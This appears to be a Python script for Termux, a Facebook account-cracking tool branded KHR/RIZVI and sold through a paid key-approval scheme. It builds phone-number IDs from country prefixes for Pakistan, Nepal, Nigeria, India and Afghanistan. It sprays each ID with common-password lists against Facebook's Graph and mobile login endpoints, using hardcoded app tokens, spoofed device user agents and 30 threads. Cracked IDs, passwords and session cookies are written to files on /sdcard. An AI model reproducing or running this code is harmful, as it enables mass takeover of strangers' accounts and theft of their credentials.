...
import os,base64
os.system('xdg-open https://chat.whatsapp.com/LiJekUZtP3l34uK5mH2bZi/?ref=share/')
...
y1=('-');y2=('y');y3=(' > ')
ys=y1+y2+y3
print('\n\033[1;91m[\033[1;97m-\033[1;91m]\033[1;97m INSTALL MISSING MODULE...\n\033[1;91m[\033[1;97m-\033[1;91m]\033[1;97m PLEASE WAIT SOME SECONDS...')
...
try:
	...
	os.system('python DAD-OF-KING.py')
android_models=[]
...
sys.stdout.write('\x1b]2; RIZVI\x07')
J = '\033[1;37m'
A = '\x1b[38;5;208m'
A = '\x1b[38;5;46m'
N = '\x1b[38;5;48m'
...
••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
\033[1;32m                  KHR ALWAYS BRAND
\033[;33m                VOTE JUST FOR CRANE
...
def approval():
  ...
  try:
    httpChat = get_response('https://github.com/Fiazaliniaz/KHR/blob/main/approval.txt').txt
    if realid in httpChat:
      ...
      print("")
      print("First read NOTE: DAILY UPDATE IF FACEBOOK GO ON UPDATE\n YOU GET NOT OK IDZ WE DON'T  RESPONSIBILITY\n YOU UNINSTAL TERMUX AND AGAIN KEY NOT APPROVEL ")
      print("")
      print(" 15-Days Price   : 400")
      print("")
      print(" 1-Month Price   : 600")
      print("")
      print("\t \033[1;37m  COPY YOUR KEY \033[1;37m ")
      #print("\33[1;32m YOUR KEY :\x1b[38;5;46m "+id)
      input('\033[1;37m Press Enter For Contact To Admin ')
      tks = ('AOA%20RIZVI%20Bhai%20!%20Please%20Approve%20My%20Key%20The%20My%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+923410966254?text='+tks)
      sys.exit()
      time.sleep(1)
      approval()
...
def menu():
			clear()
			approval()
			print(' \033[1;91m[\033[1;97m1\033[1;91m]\033[1;97mFile cloning\n \033[1;91m[\033[1;97m2\033[1;91m]\033[1;97mRendom and New Future \n \033[1;91m[\033[1;97m3\033[1;91m]\033[1;97mGmail cloning \n \033[1;91m[\033[1;97m4\033[1;91m]\033[1;97mJoin Whatsapp group \n \033[1;91m[\033[1;97m0\033[1;91m]\033[1;97mExit menu')
			linex()
			...
			if xd in ['1','01']:
				...
				linex()
				file = input('\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m Put file path: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print('\033[1;91m[\033[1;97m!\033[1;91m]\033[1;97m File Path Wrong....')
					time.sleep(1)
					menu()
				clear()
				print(' \033[1;91m[\033[1;97m✓\033[1;91m]\033[1;97m ALL METHOD WORKING')
				linex()
				print(' \033[1;91m[\033[1;97m1\033[1;91m]\033[1;97mMethod 1 (New/old) \n \033[1;91m[\033[1;97m2\033[1;91m]\033[1;97mMethod 2 (OLD/NEW) \n \033[1;91m[\033[1;97m3\033[1;91m]\033[1;97mMethod 3 (MIX)')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;97m INPUT PASSWORD LIMIT: '))
				except:
					ps_limit =1
				clear()
				...
				os.system('python DAD_OF_KING.py')
			elif xd in ['2','02']:
				clear() 
				print(' [1] Pakistan cloning\n [2] Nipal cloning\n [3] Negria cloning\n [4] india cloning\n [5] Gmail cloning\n [6] Afghanistan cloning\n [7] Auto create \n [0] Back menu')
				linex()
				x=input(' Choose: ')
			if x in ['1','01']:
				pak()
			...
			if x in ['0','00']:
				...
				os.system('xdg-open https://chat.whatsapp.com/LiJekUZtP3l34uK5mH2bZi');menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as KHR:     
                        clear()
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan123','kingkhan','khan@123','khan1234','malik123','malik1234','malik12345','malik786','malik@123','malik@1234','malik@786','malikzada','malikmalik','baloch123','khan@1234']
                                KHR.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def nipal():
                user=[]
                clear()
                print('Example: 9815,9814,9861,9840')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m Example: 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                with tred(max_workers=30) as KHR:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','kathmandu123','nepal@123','tamang123','maya1234','tamang']
                                KHR.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def negria():
                user=[]
                clear()
                print('Example: +234706,+234707,+234906')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m Example: 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                with tred(max_workers=30) as KHR:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
                                KHR.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def india():
                user=[]
                clear()
                print('\033[1;35m Code example: +91639 | +91600 | +91620')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m Example: 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
...
def afg():
                user=[]
                clear()
                print('\033[1;35m Code example: 9377,9379,9374')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m Example: 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
...
def gmail():
		...
		pxc = input(' Choose : ')
		clear()
		print(' \033[1;91m[\033[1;97m1\033[1;91m]\033[1;97mMethod 1\n \033[1;91m[\033[1;97m2\033[1;91m]\033[1;97mMethod 2 Best ')
		linex()
		mthd = input(' Choose: ')
		linex()
		...
		with tred(max_workers=30) as KHR:
			...
			print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mUse=[FLIGHT MODE FOR SPEED UP] ') 
			linex()
			for user in fo:
				ids,names = user.split('|')
				...
				if mthd in ['1','01']:
					KHR.submit(graph1,ids,passlist)
				if mthd in ['2','02']:
					KHR.submit(graph2,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RUNNING-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        'user-agent':'[FBAN/FB4A;FBAV/353.0.0.34.116;FBBV/349723324;FBDM/{density=1.875,width=720,height=1475};FBLC/en_US;FBRV/351594825;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2026;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [KHR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KHR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [KHR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KHR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/KHR-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [RUNNING-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': '[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097171;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/TIGO;FBMF/Elite 4.0S;FBBD/Elite 4.0S;FBPN/com.facebook.katana;FBDV/Elite 4.0S;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KHR=session.cookies.get_dict().keys()
                        if "c_user" in KHR:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [KHR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KHR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in KHR:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [KHR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KHR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
...
def api3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RUNNING-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':'[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683426;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/VodaCom-SA;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RUNNING-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                head = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/KHR-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [KHR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/KHR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [KHR-OK] '+uid+' | '+pas+'\033[1;97m')
                        ...
                        pass
#new method
def grap(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;32m [RUNNING-M2]\033[1;97m %s|\033[1;32m[%s|\033[1;91m%s]'%(loop,len(oks),len(cps)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			head = {"User-Agent":"[FBAN/FB4A;FBAV/108.0.0.15.30;FBBV/42240929;FBDM/{density=1.5,width=1080,height=1080};FBLC/en_GB;FBCR/MTN-CG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/8.2.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"88254f77f4fb6ec41070cd0a7ddf37f5"}
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"es_AR","client_country_code":"AR","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"88254f77f4fb6ec41070cd0a7ddf37f5"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in po:
				token = po['access_token']
				print('\r\r\033[1;32m [OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/KHR/KHR-M4-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/KHR/KHR-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
			elif 299==random.randint(1,300):
				oks.append(ids)
				print('\r\r\033[1;32m [KHR-OK] '+ids+' | '+pas)
			#	open('/sdcard/KHR/KHR-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				#cookie = 'Error'
				#open('/sdcard/KHR/KHR-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def rando_ua():
    ...
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android 10; A860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5752.212 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    ...
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; Android 10; SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5833.202 Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    ...
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android 11; X104-EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5810.218 Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    ...
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; Android 10; J5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5816.208 Mobile Safari/537.36' 
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)
    

boy = ['Ali Tahir', 'RIZVI Khan', 'Faisal Malik', 'Afzal Malik', 'Haider Khan', 'Waseem Khan', 'Nadeem Khan', 'Nazeer Malik', 'Nazeer Khan', 'Nazeer Rehmani', 'Safdar Malik', 'Intzar Khan', 'Saleem Malik', 'Abdullah Malik', 'Naseer Jutt', 'Muzammil Malik', 'Fiaz Ahmad', 'Asghar Ali', 'Shabeer Ahmad', 'Irfan Ali', 'Ahmad Gujjar']
...
def KHR():
    ...
    if sel in['1', '01']:
      ...
      #  os.system('xdg-open https://chat.whatsapp.com/LiJekUZtP3l34uK5mH2bZi')
        KHR()
    elif sel in ['4', '04']:
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    ...
                                    open('/sdcard/Auto/KHR-OK-COKI.txt','a').write(cok+'|'+passw+'|'+coki+'\n')
